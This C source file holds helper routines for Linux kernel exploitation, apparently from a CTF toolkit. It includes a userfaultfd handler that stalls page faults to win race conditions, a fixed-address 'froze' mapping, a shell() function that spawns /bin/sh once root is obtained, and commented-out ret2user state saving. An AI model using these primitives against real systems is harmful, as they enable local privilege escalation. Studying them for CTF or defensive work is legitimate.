#include "libx.h"
/*
Utils
*/
void panic(char *s){
    puts(s);
    exit(0x132);
}
void shell(){
    if(!getuid())
        system("/bin/sh");
    else
        panic("[!] Failed to Escape");
}
void info(size_t val){
    printf("[+] %p\n",val);
}

/*
Userfaultfd for race condition,
Usage:
    size_t *ptr = forze();
*/
void* userfaultfd_leak_handler(void* arg)
{
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long) arg;
    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    
    nready = poll(&pollfd, 1, -1);
    sleep(100000);
    if (nready != 1)
    {
        panic("Wrong poll return val");
    }
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0)
    {
        panic("msg err");
    }

    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        panic("[-] mmap err");
    }
    struct uffdio_copy uc;
    // init page
    memset(page, 0, sizeof(page));
    uc.src = (unsigned long) page;
    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);
    return NULL;
}
void  RegisterUserfault(void *fault_page)
{
    void *handler = userfaultfd_leak_handler;
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        panic("ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page; 
    ur.range.len   = PAGE_SIZE;
    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) 
        panic("ioctl-UFFDIO_REGISTER");

    int s = pthread_create(&thr, NULL,handler, (void*)uffd);

    if (s!=0)
        panic("pthread_create");
}
size_t * froze(){
    size_t *ptr=mmap(0xdeadbeef000,0x1000,5,0x21,0,0);
    if (ptr!=0xdeadbeef000)
        panic("[x] Froze zone");
    RegisterUserfault(ptr);
    return ptr;
}
/*
save_status for ret2user
*/
// size_t user_cs, user_ss, user_rflags, user_sp;
// void save_status()
// {
//     __asm__("mov user_cs, cs;"
//             "mov user_ss, ss;"
//             "mov user_sp, rsp;"
//             "pushf;"
//             "pop user_rflags;"
//             );
//     puts("[*]status has been saved.");
// }